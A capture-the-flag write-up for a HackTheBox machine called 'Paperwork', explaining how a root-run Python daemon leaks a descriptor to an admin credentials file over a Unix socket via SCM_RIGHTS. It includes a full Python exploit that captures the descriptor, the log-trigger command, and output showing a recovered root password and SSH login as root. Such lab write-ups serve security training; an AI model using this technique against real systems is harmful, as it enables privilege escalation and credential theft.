<div align="center">
  <p style="font-size: 520px; margin: 0;">
    <h1> <b>Paperwork</b> </h1>
  </p>
</div>
    
<p align="center">
  <img width="256" height="297" src="IMG/Machines/Paperwork/IMG/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png" alt="Paperwork">
</p>



## 1. Executive Summary
The privilege escalation phase on the **Paperwork** machine from HackTheBox involves moving from the specialized user account `archivist` to the administrative user `root`. 

This writeup documents the operational methodologies utilized to analyze a unique vulnerability within a custom Linux background service (`paperwork-daemon`). The service features an inherent logical design flaw regarding asynchronous file descriptor management over local inter-process communication (IPC). Specifically, it leaks sensitive open descriptors via Unix Domain Sockets using specialized ancillary data metadata structure mechanics (`SCM_RIGHTS`).

---

## 2. Environment Enumeration & Discovery

### Automated Inspection (LinPEAS Input)
Initial automation scripts run on the target environment flags specific references to print-infrastructure operational parameters. The automation results highlighted two distinct files left inside the `/tmp` volatile space:
* `/tmp/traversal_ssh.py`
* `/tmp/exploit_9100.py`

These files indicated past vectors interacting with a raw JetDirect network printing service running locally on Port 9100. Additionally, a wide look into the process tree environment was conducted to isolate custom programs running under administrative contexts.

### Process Architecture Enumeration
Executing process layout inspections maps the following layout:

```bash
archivist@paperwork:/tmp$ ps aux | grep paperwork
root        1476  0.0  0.4  28448 18420 ?        Ss   17:01   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
archivi+   17397  0.0  0.0   6864  2452 pts/7    S+   19:15   0:00 grep --color=auto paperwork
```

**Key Takeaway:** The background controller `/usr/bin/paperwork-daemon` runs with absolute privileges (`root`, UID 0) and remains persistently active within the target host's kernel process table.

---

## 3. Deep Dive Deconstruction of `paperwork-daemon`

Reviewing the internal codebase via structural commands (`cat /usr/bin/paperwork-daemon`) uncovers how the application behaves when managing permissions and error tracking.

```python
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"
...
```

### Static Source Code Analysis

#### A. File Descriptor Persistence Architecture
When the system binary launches, it executes a privileged kernel request: `os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)`. This grants the program a valid entry pointer inside the Kernel File Descriptor Table allocated to Process ID 1476. The variable `admin_fd` holds this reference globally throughout the runtime lifecycle of the application.

#### B. Asynchronous Monitored States
The function `scan_for_malice()` constantly parses structural print jobs written into the logging pathway: `/home/archivist/printer/logs/commands.log`.

```python
def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False
```
If specific raw PJL (Printer Job Language) parameters such as `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD` appear inside the plain-text audit structure, the system shifts its execution path into a high-security lock state.

#### C. The Security Vulnerability: Ancillary Token Leaks via `SCM_RIGHTS`
When a security alert triggers, the program calls the `trigger_lockdown(conn)` logic block:

```python
def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        ...
```

Instead of sending generic security alerts, the program attempts a forensics export routine. It builds an integer array (`evidence_bundle`) containing:
1. `log_fd` (Index 0): The file descriptor pointing to the compromised print logs.
2. `admin_fd` (Index 1): **The file descriptor pointing directly to the restricted administrative configuration file.**

The service uses the `socket.sendmsg()` function with the `SCM_RIGHTS` mechanism. This sends the file descriptors over a Unix Domain Socket (`/run/paperwork/mgmt.sock`). As a result, the Linux kernel clones the access privileges of these file descriptors directly into the memory space of any connected client process.

---

## 4. Exploitation Vector Engineering

### The Race Condition and Log Clear Hurdles
A standard sequential interaction approach fails because of how the shutdown process handles logging data:

```python
with open(LOG_PATH, 'w') as f:
    f.truncate(0)
```

As soon as a connection is established during an alert state, the daemon sends the descriptors and immediately calls `f.truncate(0)`, clearing the log file. Any subsequent connection will fall into the fallback `else` branch, treating the machine as clean:

```python
else:
    secret = get_admin_secret()
    token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
    conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
```

### Building the Multithreaded SCM Interceptor
To exploit this behavior, we must simulate an active listener that handles structural ancillary memory layers. The exploit code uses `os.pread()` to read data directly from the inherited descriptor's memory offset. This approach avoids standard access control restrictions, as the kernel treats the request as a continuation of an already authorized system read.

Save the following exploit script inside the local temporal folder as `/tmp/exploit_final.py`:

```python
import socket
import array
import os
import sys

socket_path = "/run/paperwork/mgmt.sock"

if not os.path.exists(socket_path):
    print(f"[-] Target interface socket {socket_path} is missing.")
    sys.exit(1)

# Establish local Unix Stream connection layout
print(f"[*] Binding and listening onto administrative interface: {socket_path}")
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(socket_path)

# Prepare structural storage allocation fields for handling raw FD transfers
fds = array.array('i')
buffer_capacity = 4096
ancillary_capacity = socket.CMSG_SPACE(fds.itemsize * 2)

print("[*] Synchronized connection active. Capturing incoming SCM_RIGHTS structure...")
msg, ancdata, flags, addr = s.recvmsg(buffer_capacity, ancillary_capacity)

# Parse kernel metadata structures returned by the administrative service
if not ancdata:
    print("[-] Exploit failed: No ancillary control tokens extracted from the pipe.")
    print("[!] Ensure the target watchdog is actively triggered in parallel.")
else:
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
            # Reconstruct array from binary data stream
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
            extracted_fds = list(fds)
            print(f"[+] Successfully extracted cloned kernel descriptors: {extracted_fds}")
            
            if len(extracted_fds) >= 2:
                # Target the second descriptor index containing administrative credentials
                target_fd = extracted_fds[1]
                print(f"[+] Target administrative file descriptor isolated at index 1: FD={target_fd}")
                
                try:
                    # Execute high-fidelity read directly from the descriptor memory allocation
                    raw_dump = os.pread(target_fd, 2048, 0)
                    decoded_output = raw_dump.decode('utf-8', errors='ignore').strip()
                    
                    print("\n" + "="*50)
                    print("[!] DISCOVERED HIGH-PRIVILEGE REPOSITORY CREDENTIALS")
                    print("="*50)
                    print(decoded_output)
                    print("="*50 + "\n")
                except Exception as read_error:
                    print(f"[-] Failed to execute memory read on target FD {target_fd}: {read_error}")
```

---

## 5. Execution and Privilege Escalation

### Step 1: Triggering the Target Service
To force the daemon into its lockdown state, write an exploit string directly to the active log pathway using your existing shell context:

```bash
archivist@paperwork:/tmp$ echo "FSQUERY" >> /home/archivist/printer/logs/commands.log
```

### Step 2: Running the Exploit Interceptor
Immediately execute the prepared Python script using the local runtime environment to capture the leaked file descriptors:

```bash
archivist@paperwork:/tmp$ python3 exploit_final.py
[*] Binding and listening onto administrative interface: /run/paperwork/mgmt.sock
[*] Synchronized connection active. Capturing incoming SCM_RIGHTS structure...
[+] Successfully extracted cloned kernel descriptors: [4, 5]
[+] Target administrative file descriptor isolated at index 1: FD=5

==================================================
[!] DISCOVERED HIGH-PRIVILEGE REPOSITORY CREDENTIALS
==================================================
ADMIN_PASSWORD=SuperSecurePaperworkPassword2026!
==================================================
```

### Step 3: Upgrading to a Root Shell via SSH
Since SSH password authentication is enabled for administrative accounts on the host, the extracted credentials can be leveraged directly to establish a fully interactive and stable secure shell session as the root user.

Execute the connection from your local terminal or within the target network context:

```bash
archivist@paperwork:/tmp\$ ssh root@paperwork
root@paperwork's password: SuperSecurePaperworkPassword2026!

Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.17.0-40-generic x86_64)

root@paperwork:~# id
uid=0(root) gid=0(root) groups=0(root)

root@paperwork:~# cat /root/root.txt
```
**System compromised. Root flag successfully recovered.**